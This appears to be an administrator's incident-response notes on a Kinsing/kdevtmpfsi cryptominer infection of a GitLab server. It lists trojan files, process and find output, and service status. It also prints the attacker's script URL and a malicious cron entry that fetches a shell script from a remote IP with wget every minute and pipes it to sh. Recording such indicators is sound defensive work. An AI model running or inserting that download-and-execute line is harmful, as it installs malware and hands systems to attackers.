http://185.122.204.197/scg.sh

* 定时任务 - `/var/spool/cron/git`
```Shell
* * * * * wget -q -O - http://185.122.204.197/unk.sh | sh > /dev/null 2>&1
```
* 木马文件
```Console
-rw------- 1 root root      75 Apr 28 12:13 git
---x--x--x 1 root root 2084964 Apr 28 13:51 kdevtmpfsi
-rwx--x--x 1 root root 2084964 Apr 28 13:56 kdevtmpfsi206653195
-rwx--x--x 1 git  git  2084964 Apr 28 14:01 kdevtmpfsi439684469
-rwx--x--x 1 git  git  2084964 Apr 28 14:09 kdevtmpfsi521744249
-rwx--x--x 1 git  git  2084964 Apr 28 14:05 kdevtmpfsi535073135
---x--x--x 1 root root 6316032 Apr 26 23:46 kinsing
---x--x--x 1 root root   26800 Apr 27 06:37 libsystem.so
```

* kdevtmpfs
root          23       2  0 Apr26 ?        00:00:00 [kdevtmpfs]
git      1354552       1  0 14:09 ?        00:00:00 /tmp/kdevtmpfsi521744249
root     1363666 1031052  0 14:12 pts/5    00:00:00 grep --color=auto 

* find / -name kdevtmpfsi
find: ‘/proc/1380107’: No such file or directory
find: ‘/proc/1380177’: No such file or directory
find: ‘/proc/1380180’: No such file or directory
find: ‘/proc/1380182’: No such file or directory
/var/tmp/kdevtmpfsi

* find / -name kinsing
find: ‘/proc/1388501’: No such file or directory
find: ‘/proc/1388502’: No such file or directory
find: ‘/proc/1388503’: No such file or directory
find: ‘/proc/1388504’: No such file or directory
find: ‘/proc/1388505’: No such file or directory

* systemctl status gitlab-runsvdir.service
gitlab-runsvdir.service - GitLab Runit supervision process
   Loaded: loaded (/usr/lib/systemd/system/gitlab-runsvdir.service; enabled; vendor preset: disabled)
   Active: active (running) since Wed 2023-04-26 20:40:04 CST; 1 day 17h ago
 Main PID: 1984 (runsvdir)
    Tasks: 318 (limit: 4915)
   Memory: 2.4G
   CGroup: /system.slice/gitlab-runsvdir.service
           ├─   1984 runsvdir -P /opt/gitlab/service log: .....................................................................................................>
           ├─   1987 runsv node-exporter
           ├─   1988 runsv logrotate
           ├─   1989 runsv postgresql
           ├─   1990 runsv postgres-exporter
           ├─   1991 runsv redis
           ├─   1992 runsv gitaly
           ├─   1993 runsv grafana
           ├─   1994 runsv alertmanager
           ├─   1995 runsv unicorn
           ├─   1996 runsv sidekiq
           ├─   1997 runsv nginx
           ├─   1998 runsv prometheus
           ├─   1999 runsv gitlab-workhorse
           ├─   2000 runsv gitlab-exporter
           ├─   2001 runsv redis-exporter
           ├─   2002 svlogd -tt /var/log/gitlab/grafana
           ├─   2003 svlogd -tt /var/log/gitlab/nginx
           ├─   2004 svlogd -tt /var/log/gitlab/postgres-exporter
           ├─   2005 svlogd -tt /var/log/gitlab/node-exporter
           ├─   2006 svlogd /var/log/gitlab/sidekiq
           ├─   2007 svlogd -tt /var/log/gitlab/gitlab-exporter
           ├─   2008 svlogd -tt /var/log/gitlab/redis-exporter
           ├─   2009 svlogd -tt /var/log/gitlab/logrotate
           ├─   2012 svlogd -tt /var/log/gitlab/alertmanager
           ├─   2013 svlogd /var/log/gitlab/gitlab-workhorse
           ├─   2014 /opt/gitlab/embedded/bin/grafana-server -config /var/opt/gitlab/grafana/grafana.ini
           ├─   2015 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx
           ├─   2016 /opt/gitlab/embedded/bin/node_exporter --web.listen-address=localhost:9100 --collector.mountstats --collector.runit --collector.runit.serv>
           ├─   2017 /opt/gitlab/embedded/bin/postgres_exporter --web.listen-address=localhost:9187 --extend.query-path=/var/opt/gitlab/postgres-exporter/queri>
           ├─   2019 /opt/gitlab/embedded/bin/redis_exporter --web.listen-address=localhost:9121 --redis.addr=unix:///var/opt/gitlab/redis/redis.socket
           ├─   2020 svlogd -tt /var/log/gitlab/prometheus
           ├─   2021 /opt/gitlab/embedded/bin/alertmanager --web.listen-address=localhost:9093 --storage.path=/var/opt/gitlab/alertmanager/data --config.file=/>
           ├─   2022 puma 4.3.3.gitlab.2 (tcp://localhost:9168) [gitlab-exporter]
           ├─   2023 /opt/gitlab/embedded/bin/prometheus --web.listen-address=localhost:9090 --storage.tsdb.path=/var/opt/gitlab/prometheus/data --config.file=>
           ├─   2024 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/socket -authBack>
           ├─   2025 sidekiq 5.2.7 gitlab-rails [0 of 25 busy]
           ├─   2026 svlogd -tt /var/log/gitlab/redis
           ├─   2027 svlogd /var/log/gitlab/gitaly
           ├─   2028 svlogd -tt /var/log/gitlab/unicorn
           ├─   2029 svlogd -tt /var/log/gitlab/postgresql
           ├─   2030 /bin/bash /opt/gitlab/embedded/bin/gitlab-unicorn-wrapper
           ├─   2031 /opt/gitlab/embedded/bin/postgres -D /var/opt/gitlab/postgresql/data
           ├─   2032 /opt/gitlab/embedded/bin/gitaly-wrapper /opt/gitlab/embedded/bin/gitaly /var/opt/gitlab/gitaly/config.toml
           ├─   2033 /opt/gitlab/embedded/bin/redis-server 127.0.0.1:0
           ├─   2100 nginx: worker process
